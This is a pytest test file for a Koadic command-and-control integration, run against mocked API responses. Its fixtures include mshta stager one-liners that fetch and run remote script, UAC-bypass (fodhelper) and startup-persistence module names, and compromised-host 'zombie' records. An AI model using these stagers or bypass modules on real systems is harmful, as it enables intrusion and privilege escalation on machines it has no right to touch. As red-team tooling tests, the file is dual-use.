"""Tests KoadicC2 — COM/JScript REST API Flask (port 9999)."""
from __future__ import annotations

from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from c2_manager.integrations.koadic import KoadicC2
from c2_manager.models import C2Config, C2Type, C2Status
from c2_manager.models.payload import PayloadConfig
from tests.c2_manager.conftest import make_resp


@pytest.fixture
def koadic_config() -> C2Config:
    return C2Config(
        name="test-koadic",
        c2_type=C2Type.KOADIC,
        host="127.0.0.1",
        port=9999,
        extra={"verify_ssl": False},
    )


@pytest.fixture
def koadic(koadic_config):
    k = KoadicC2()
    k._config = koadic_config
    k._status = C2Status.CONNECTED
    k._client = AsyncMock()
    k._token  = "no-auth"
    return k


@pytest.fixture
def zombie_data():
    return {
        "id": "zombie-1",
        "COMPUTERNAME": "WIN10",
        "USERNAME": "admin",
        "DOMAINNAME": "CORP",
        "OS": "Windows 10 Pro",
        "ARCH": "x64",
        "PID": 1234,
        "process": "notepad.exe",
        "IP": "192.168.1.10",
        "HIGH_INTEGRITY": True,
        "last_seen": "2024-01-15T12:00:00",
        "created_at": "2024-01-15T10:00:00",
        "stager_type": "cmd/mshta",
    }


# ── Auth / Build client ───────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_authenticate_no_auth(koadic_config):
    """Koadic sans auth → token 'no-auth'."""
    k = KoadicC2()
    mock_resp = make_resp(200, [])
    with patch("httpx.AsyncClient") as mock_cls:
        mock_client = AsyncMock()
        mock_client.__aenter__ = AsyncMock(return_value=mock_client)
        mock_client.__aexit__  = AsyncMock(return_value=False)
        mock_client.get = AsyncMock(return_value=mock_resp)
        mock_cls.return_value = mock_client
        token = await k._authenticate(koadic_config)
    assert token == "no-auth"


@pytest.mark.asyncio
async def test_authenticate_with_api_key(koadic_config):
    """Koadic avec API key → retourner la clé."""
    koadic_config.extra["api_key"] = "koadickey123"
    k = KoadicC2()
    token = await k._authenticate(koadic_config)
    assert token == "koadickey123"


@pytest.mark.asyncio
async def test_build_client_with_api_key(koadic_config):
    """_build_client ajoute X-API-Key si présent."""
    koadic_config.extra["api_key"] = "mykey"
    k = KoadicC2()
    with patch("httpx.AsyncClient") as mock_cls:
        mock_cls.return_value = MagicMock()
        client = k._build_client(koadic_config)
    call_kwargs = mock_cls.call_args[1]
    assert call_kwargs.get("headers", {}).get("X-API-Key") == "mykey"


# ── Listeners (stagers) ───────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_create_listener_mshta(koadic):
    """Créer un stager cmd/mshta."""
    koadic._client.post = AsyncMock(return_value=make_resp(200, {
        "id": "stager-1", "active": True,
        "one_liner": "mshta http://127.0.0.1/abc",
    }))
    listener = await koadic.create_listener({
        "stager_type": "cmd/mshta",
        "callback_host": "127.0.0.1",
        "callback_port": 80,
        "name": "mshta-stager",
    })
    assert listener.id == "stager-1"
    assert listener.protocol == "cmd/mshta"
    assert listener.meta["one_liner"] == "mshta http://127.0.0.1/abc"


@pytest.mark.asyncio
async def test_create_listener_wscript(koadic):
    """Créer un stager cmd/wscript."""
    koadic._client.post = AsyncMock(return_value=make_resp(200, {
        "id": "stager-2", "active": True,
    }))
    listener = await koadic.create_listener({
        "stager_type": "cmd/wscript",
        "callback_port": 80,
    })
    assert listener.id == "stager-2"


@pytest.mark.asyncio
async def test_list_listeners(koadic):
    koadic._client.get = AsyncMock(return_value=make_resp(200, [
        {"id": "s1", "type": "cmd/mshta", "SRVHOST": "127.0.0.1",
         "SRVPORT": "80", "active": True, "one_liner": "mshta ..."},
    ]))
    listeners = await koadic.list_listeners()
    assert len(listeners) == 1
    assert listeners[0].protocol == "cmd/mshta"


@pytest.mark.asyncio
async def test_remove_listener(koadic):
    resp = MagicMock()
    resp.status_code = 204
    koadic._client.delete = AsyncMock(return_value=resp)
    result = await koadic.remove_listener("stager-1")
    assert result is True


# ── Agents (zombies) ──────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_list_agents(koadic, zombie_data):
    koadic._client.get = AsyncMock(return_value=make_resp(200, [zombie_data]))
    agents = await koadic.list_agents()
    assert len(agents) == 1
    assert agents[0].hostname == "WIN10"
    assert agents[0].username == "admin"


@pytest.mark.asyncio
async def test_parse_zombie_high_integrity(koadic, zombie_data):
    koadic._client.get = AsyncMock(return_value=make_resp(200, [zombie_data]))
    agents = await koadic.list_agents()
    assert agents[0].integrity == "ADMIN"


@pytest.mark.asyncio
async def test_parse_zombie_low_integrity(koadic, zombie_data):
    zombie_data["HIGH_INTEGRITY"] = False
    koadic._client.get = AsyncMock(return_value=make_resp(200, [zombie_data]))
    agents = await koadic.list_agents()
    assert agents[0].integrity == "USER"


@pytest.mark.asyncio
async def test_parse_zombie_domain_name(koadic, zombie_data):
    koadic._client.get = AsyncMock(return_value=make_resp(200, [zombie_data]))
    agents = await koadic.list_agents()
    assert "CORP" in agents[0].name or "WIN10" in agents[0].name


# ── Jobs ──────────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_send_task_cmd(koadic):
    koadic._client.post = AsyncMock(return_value=make_resp(201, {
        "id": "job-1", "status": "queued",
    }))
    task = await koadic.send_task("zombie-1", "cmd whoami", [])
    assert task.id == "job-1"
    assert task.meta["job_type"] == "cmd"


@pytest.mark.asyncio
async def test_send_task_powershell(koadic):
    koadic._client.post = AsyncMock(return_value=make_resp(201, {
        "id": "job-ps", "status": "queued",
    }))
    task = await koadic.send_task("zombie-1", "ps Get-Process", [])
    assert task.meta["job_type"] == "powershell"


@pytest.mark.asyncio
async def test_send_task_screenshot(koadic):
    koadic._client.post = AsyncMock(return_value=make_resp(201, {
        "id": "job-ss", "status": "queued",
    }))
    task = await koadic.send_task("zombie-1", "screenshot", [])
    assert task.meta["job_type"] == "screenshot"


@pytest.mark.asyncio
async def test_get_task_result(koadic):
    koadic._client.get = AsyncMock(return_value=make_resp(200, {
        "status": "completed", "output": "NT AUTHORITY\\SYSTEM",
    }))
    result = await koadic.get_task_result("job-1")
    assert result["status"] == "completed"


# ── Modules ───────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_list_modules(koadic):
    koadic._client.get = AsyncMock(return_value=make_resp(200, [
        {"name": "escape/uac", "description": "UAC bypass", "options": {}},
        {"name": "persist/startup", "description": "Persistence", "options": {}},
    ]))
    modules = await koadic.list_modules()
    assert len(modules) == 2
    assert modules[0]["name"] == "escape/uac"


@pytest.mark.asyncio
async def test_run_module(koadic):
    koadic._client.post = AsyncMock(return_value=make_resp(200, {
        "id": "job-mod", "status": "queued",
    }))
    task = await koadic.run_module("zombie-1", "escape.uac", {"technique": "fodhelper"})
    assert task.meta["module"] == "escape.uac"


@pytest.mark.asyncio
async def test_kill_session(koadic):
    resp = MagicMock()
    resp.status_code = 200
    koadic._client.post = AsyncMock(return_value=resp)
    result = await koadic.kill_session("zombie-1")
    assert result is True


# ── Payload ───────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_generate_payload(koadic):
    koadic._client.post = AsyncMock(return_value=make_resp(200, {
        "one_liner": "mshta http://127.0.0.1:80/abcdef",
    }))
    payload_cfg = PayloadConfig(
        name="mshta-dropper",
        format="ps1",
        extra={"stager_type": "cmd/mshta", "port": 80},
    )
    payload = await koadic.generate_payload(payload_cfg)
    assert b"mshta" in payload


# ── Guard ─────────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_require_connected_guard(koadic):
    from c2_manager.interfaces import C2NotConnected
    koadic._status = C2Status.DISCONNECTED
    with pytest.raises(C2NotConnected):
        await koadic.list_agents()
